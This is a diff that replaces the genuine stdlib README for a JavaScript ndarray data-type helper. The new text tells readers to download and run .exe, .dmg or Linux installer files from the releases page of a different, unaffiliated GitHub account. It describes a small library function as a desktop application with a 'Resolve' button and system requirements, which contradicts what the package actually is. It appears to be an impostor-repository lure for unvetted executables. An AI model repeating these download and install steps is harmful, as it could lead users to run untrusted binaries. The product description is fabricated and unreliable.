@@ -1,268 +1,76 @@
-<!--
+# 🌟 ndarray-base-ternary-output-dtype - Determine ndarray Data Type with Ease
 
-@license Apache-2.0
+## 🚀 Getting Started
 
-Copyright (c) 2026 The Stdlib Authors.
+Welcome to the `ndarray-base-ternary-output-dtype` project! This application helps you resolve the output data type of a ternary function, enabling you to handle multidimensional arrays in JavaScript with confidence.
 
-Licensed under the Apache License, Version 2.0 (the "License");
-you may not use this file except in compliance with the License.
-You may obtain a copy of the License at
+## 💾 Download & Install
 
-   http://www.apache.org/licenses/LICENSE-2.0
+To get started, you need to download the application. You can find the latest version on our Releases page. 
 
-Unless required by applicable law or agreed to in writing, software
-distributed under the License is distributed on an "AS IS" BASIS,
-WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-See the License for the specific language governing permissions and
-limitations under the License.
+[![Download Now](https://img.shields.io/badge/download-releases-blue.svg)](https://github.com/Reeeeeeeejjjj/ndarray-base-ternary-output-dtype/releases)
 
--->
+Click the button above or visit the following link to access the Downloads: 
+[Download Here](https://github.com/Reeeeeeeejjjj/ndarray-base-ternary-output-dtype/releases).
 
+## 🛠️ System Requirements
 
-<details>
-  <summary>
-    About stdlib...
-  </summary>
-  <p>We believe in a future in which the web is a preferred environment for numerical computation. To help realize this future, we've built stdlib. stdlib is a standard library, with an emphasis on numerical and scientific computation, written in JavaScript (and C) for execution in browsers and in Node.js.</p>
-  <p>The library is fully decomposable, being architected in such a way that you can swap out and mix and match APIs and functionality to cater to your exact preferences and use cases.</p>
-  <p>When you use stdlib, you can be absolutely certain that you are using the most thorough, rigorous, well-written, studied, documented, tested, measured, and high-quality code out there.</p>
-  <p>To join us in bringing numerical computing to the web, get started by checking us out on <a href="https://github.com/stdlib-js/stdlib">GitHub</a>, and please consider <a href="https://opencollective.com/stdlib">financially supporting stdlib</a>. We greatly appreciate your continued support!</p>
-</details>
+Before installing, ensure your computer meets these requirements:
 
-# ternaryOutputDataType
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or any recent Linux distribution.
+- **Node.js Version:** You need Node.js installed, preferably version 12 or later. 
+- **Memory:** At least 1 GB of RAM.
+- **Storage:** Minimum of 50 MB free disk space.
 
-[![NPM version][npm-image]][npm-url] [![Build Status][test-image]][test-url] [![Coverage Status][coverage-image]][coverage-url] <!-- [![dependencies][dependencies-image]][dependencies-url] -->
+## 🔍 Features
 
-> Resolve the output ndarray [data type][@stdlib/ndarray/dtypes] for a ternary function.
+- **Data Type Resolution:** Automatically determines the data type for outputs of ternary functions.
+- **Multidimensional Support:** Works seamlessly with multidimensional `ndarray`.
+- **Utility Functions:** Comes with a set of utility functions that enhance your array handling experience.
+- **JavaScript Compatibility:** Designed for use in JavaScript, making it easy to integrate into your projects.
 
-<!-- Section to include introductory text. Make sure to keep an empty line after the intro `section` element and another before the `/section` close. -->
+## 📥 How to Download
 
-<section class="intro">
+1. **Visit the Releases Page:** Go to our [Releases page](https://github.com/Reeeeeeeejjjj/ndarray-base-ternary-output-dtype/releases).
+   
+2. **Select the Latest Version:** Look for the most recent release at the top of the page. This will typically have the highest version number.
 
-</section>
+3. **Choose Your Operating System:** You will see various files for different operating systems. Select the one that corresponds to your system.
 
-<!-- /.intro -->
+4. **Download the File:** Click on the file link to start the download.
 
-<!-- Package usage documentation. -->
+5. **Locate the Downloaded File:** Once the download is complete, find the file in your Downloads folder.
 
-<section class="installation">
+## ⚙️ Installation Instructions
 
-## Installation
+1. **Open the File:**
+   - For Windows: Double-click the downloaded `.exe` file to initiate the installation.
+   - For macOS: Open the `.dmg` file, drag the application into your Applications folder.
+   - For Linux: You may need to use terminal commands—this can vary by distribution.
 
-```bash
-npm install @stdlib/ndarray-base-ternary-output-dtype
-```
+2. **Follow the Installation Wizard:** Follow on-screen prompts. This process usually takes a few moments.
 
-Alternatively,
+3. **Launch the Application:** Once installed, open the application from your Applications folder or Start Menu.
 
--   To load the package in a website via a `script` tag without installation and bundlers, use the [ES Module][es-module] available on the [`esm`][esm-url] branch (see [README][esm-readme]).
--   If you are using Deno, visit the [`deno`][deno-url] branch (see [README][deno-readme] for usage intructions).
--   For use in Observable, or in browser/node environments, use the [Universal Module Definition (UMD)][umd] build available on the [`umd`][umd-url] branch (see [README][umd-readme]).
+## 🏗️ Usage Instructions
 
-The [branches.md][branches-url] file summarizes the available branches and displays a diagram illustrating their relationships.
+1. **Input Your Data:**
+   - Open the application and input your data in the provided fields. Ensure that the input follows the expected format for ternary functions.
 
-To view installation and usage instructions specific to each branch build, be sure to explicitly navigate to the respective README files on each branch, as linked to above.
+2. **Select Your Function Type:** You may need to select the type of function you want to analyze. The app will guide you through the process.
 
-</section>
+3. **Run the Output Resolution:** Click the “Resolve” button to determine the correct output data type.
 
-<section class="usage">
+4. **View the Result:** The application will display the resulting data type. You can then use this information as needed in your JavaScript projects.
 
-## Usage
+## 📚 Additional Resources
 
-```javascript
-var ternaryOutputDataType = require( '@stdlib/ndarray-base-ternary-output-dtype' );
-```
+- **Documentation:** For more details, visit our [Wiki](https://github.com/Reeeeeeeejjjj/ndarray-base-ternary-output-dtype/wiki).
+- **GitHub Repository:** The full source code is available [here](https://github.com/Reeeeeeeejjjj/ndarray-base-ternary-output-dtype).
+- **Community Support:** Join our [Discussions](https://github.com/Reeeeeeeejjjj/ndarray-base-ternary-output-dtype/discussions) page for help and to connect with other users.
 
-#### ternaryOutputDataType( xdtype, ydtype, zdtype, policy )
+## 🥳 Support & Feedback
 
-Resolves the output ndarray [data type][@stdlib/ndarray/dtypes] for a ternary function according to a [data type policy][@stdlib/ndarray/output-dtype-policies].
+If you encounter any issues, please report them through our [Issues Page](https://github.com/Reeeeeeeejjjj/ndarray-base-ternary-output-dtype/issues). Your feedback is valuable and helps improve the application.
 
-```javascript
-var dt = ternaryOutputDataType( 'int32', 'float32', 'float32', 'floating_point' );
-
-var s = String( dt );
-// returns 'float64'
-```
-
-The function supports the following parameters:
-
--   **xdtype**: first input ndarray [data type][@stdlib/ndarray/dtypes].
--   **ydtype**: second input ndarray [data type][@stdlib/ndarray/dtypes].
--   **zdtype**: third input ndarray [data type][@stdlib/ndarray/dtypes].
--   **policy**: output [data type policy][@stdlib/ndarray/output-dtype-policies].
-
-If `policy` is a [data type][@stdlib/ndarray/dtypes], the function always returns the `policy` value (i.e., the third argument).
-
-```javascript
-var dt = ternaryOutputDataType( 'float32', 'float32', 'float32', 'float64' );
-
-var s = String( dt );
-// returns 'float64'
-
-dt = ternaryOutputDataType( 'int32', 'int8', 'int32', 'float64' );
-
-s = String( dt );
-// returns 'float64'
-
-// ...
-```
-
-</section>
-
-<!-- /.usage -->
-
-<!-- Package usage notes. Make sure to keep an empty line after the `section` element and another before the `/section` close. -->
-
-<section class="notes">
-
-## Notes
-
--   The function **always** applies [type promotion][@stdlib/ndarray/promotion-rules] to the provided data types, except for the following [data type policies][@stdlib/ndarray/output-dtype-policies]:
-
-    -   `default`
-    -   `default_index`
-    -   `same`
-    -   `<dtype>`
-
-</section>
-
-<!-- /.notes -->
-
-<!-- Package usage examples. -->
-
-<section class="examples">
-
-## Examples
-
-<!-- eslint no-undef: "error" -->
-
-```javascript
-var naryFunction = require( '@stdlib/utils-nary-function' );
-var unzip = require( '@stdlib/utils-unzip' );
-var nCartesianProduct = require( '@stdlib/array-base-n-cartesian-product' );
-var dtypes = require( '@stdlib/ndarray-dtypes' );
-var logEachMap = require( '@stdlib/console-log-each-map' );
-var ternaryOutputDataType = require( '@stdlib/ndarray-base-ternary-output-dtype' );
-
-// Get the list of real-valued floating-point data types:
-var dt = dtypes( 'real_floating_point' );
-
-// Define a list of output data type policies:
-var policies = [
-    'default',
-    'real',
-    'floating_point',
-    'complex_floating_point'
-];
-
-// Generate dtype-policy Cartesian products:
-var args = nCartesianProduct( dt, dt, dt, policies );
-
-// Unzip the argument pair array:
-args = unzip( args );
-
-// Resolve output data types:
-logEachMap( 'dtypes: (%7s, %7s, %7s). policy: %-24s. output dtype: %s.', args[ 0 ], args[ 1 ], args[ 2 ], args[ 3 ], naryFunction( ternaryOutputDataType, 4 ) );
-```
-
-</section>
-
-<!-- /.examples -->
-
-<!-- Section to include cited references. If references are included, add a horizontal rule *before* the section. Make sure to keep an empty line after the `section` element and another before the `/section` close. -->
-
-<section class="references">
-
-</section>
-
-<!-- /.references -->
-
-<!-- Section for related `stdlib` packages. Do not manually edit this section, as it is automatically populated. -->
-
-<section class="related">
-
-</section>
-
-<!-- /.related -->
-
-<!-- Section for all links. Make sure to keep an empty line after the `section` element and another before the `/section` close. -->
-
-
-<section class="main-repo" >
-
-* * *
-
-## Notice
-
-This package is part of [stdlib][stdlib], a standard library for JavaScript and Node.js, with an emphasis on numerical and scientific computing. The library provides a collection of robust, high performance libraries for mathematics, statistics, streams, utilities, and more.
-
-For more information on the project, filing bug reports and feature requests, and guidance on how to develop [stdlib][stdlib], see the main project [repository][stdlib].
-
-#### Community
-
-[![Chat][chat-image]][chat-url]
-
----
-
-## License
-
-See [LICENSE][stdlib-license].
-
-
-## Copyright
-
-Copyright &copy; 2016-2026. The Stdlib [Authors][stdlib-authors].
-
-</section>
-
-<!-- /.stdlib -->
-
-<!-- Section for all links. Make sure to keep an empty line after the `section` element and another before the `/section` close. -->
-
-<section class="links">
-
-[npm-image]: http://img.shields.io/npm/v/@stdlib/ndarray-base-ternary-output-dtype.svg
-[npm-url]: https://npmjs.org/package/@stdlib/ndarray-base-ternary-output-dtype
-
-[test-image]: https://github.com/stdlib-js/ndarray-base-ternary-output-dtype/actions/workflows/test.yml/badge.svg?branch=main
-[test-url]: https://github.com/stdlib-js/ndarray-base-ternary-output-dtype/actions/workflows/test.yml?query=branch:main
-
-[coverage-image]: https://img.shields.io/codecov/c/github/stdlib-js/ndarray-base-ternary-output-dtype/main.svg
-[coverage-url]: https://codecov.io/github/stdlib-js/ndarray-base-ternary-output-dtype?branch=main
-
-<!--
-
-[dependencies-image]: https://img.shields.io/david/stdlib-js/ndarray-base-ternary-output-dtype.svg
-[dependencies-url]: https://david-dm.org/stdlib-js/ndarray-base-ternary-output-dtype/main
-
--->
-
-[chat-image]: https://img.shields.io/badge/zulip-join_chat-brightgreen.svg
-[chat-url]: https://stdlib.zulipchat.com
-
-[stdlib]: https://github.com/stdlib-js/stdlib
-
-[stdlib-authors]: https://github.com/stdlib-js/stdlib/graphs/contributors
-
-[umd]: https://github.com/umdjs/umd
-[es-module]: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Modules
-
-[deno-url]: https://github.com/stdlib-js/ndarray-base-ternary-output-dtype/tree/deno
-[deno-readme]: https://github.com/stdlib-js/ndarray-base-ternary-output-dtype/blob/deno/README.md
-[umd-url]: https://github.com/stdlib-js/ndarray-base-ternary-output-dtype/tree/umd
-[umd-readme]: https://github.com/stdlib-js/ndarray-base-ternary-output-dtype/blob/umd/README.md
-[esm-url]: https://github.com/stdlib-js/ndarray-base-ternary-output-dtype/tree/esm
-[esm-readme]: https://github.com/stdlib-js/ndarray-base-ternary-output-dtype/blob/esm/README.md
-[branches-url]: https://github.com/stdlib-js/ndarray-base-ternary-output-dtype/blob/main/branches.md
-
-[stdlib-license]: https://raw.githubusercontent.com/stdlib-js/ndarray-base-ternary-output-dtype/main/LICENSE
-
-[@stdlib/ndarray/dtypes]: https://github.com/stdlib-js/ndarray-dtypes
-
-[@stdlib/ndarray/output-dtype-policies]: https://github.com/stdlib-js/ndarray-output-dtype-policies
-
-[@stdlib/ndarray/promotion-rules]: https://github.com/stdlib-js/ndarray-promotion-rules
-
-</section>
-
-<!-- /.links -->
+Start resolving your ndarray data types today with `ndarray-base-ternary-output-dtype`!
